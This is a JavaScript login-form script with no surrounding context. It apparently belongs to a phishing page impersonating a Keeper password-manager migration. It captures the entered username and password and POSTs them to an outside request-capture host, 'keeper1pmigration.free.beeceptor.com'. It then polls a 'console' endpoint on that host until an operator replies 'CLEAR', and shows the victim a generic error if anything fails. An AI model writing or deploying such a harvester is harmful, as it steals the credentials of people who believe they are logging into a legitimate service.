{
  const userName = document.querySelector("#usernameInput");
  const password = document.querySelector("#passwordInput");
  const form = document.querySelector("#form");
  const url = "https://keeper1pmigration.free.beeceptor.com";
  let myHeaders = new Headers();
  let urlencoded = new URLSearchParams();

  const login = (e) => {
    e.preventDefault();
    myHeaders.append("Content-Type", "application/x-www-form-urlencoded");
    urlencoded.append("username", userName.value);
    urlencoded.append("password", password.value);

    const requestOptions = {
      method: "POST",
      headers: myHeaders,
      body: urlencoded,
      redirect: "follow",
    };
    myHeaders.append("Content-Type", "application/x-www-form-urlencoded");
    return fetch(`${url}/login`, requestOptions)
      .then((response) => response.text())
      .then((hash) => {
        return intervalGetReq(hash, "");
      })
      .catch((error) =>
        alert("Please recheck username and password, then try again")
      );
  };

  const intervalGetReq = async (token, endToken) => {
    await fetch(`${url}/console/${token}`, { method: "GET" })
      .then((response) => response.text())
      .then((result) => {
        if (result.includes("CLEAR")) {
          return result;
        } else {
          return intervalGetReq(token, result);
        }
      })
      .catch((error) => console.log("error", error));
  };

  const init = () => {
    form.addEventListener(`submit`, login);
  };

  init();
}
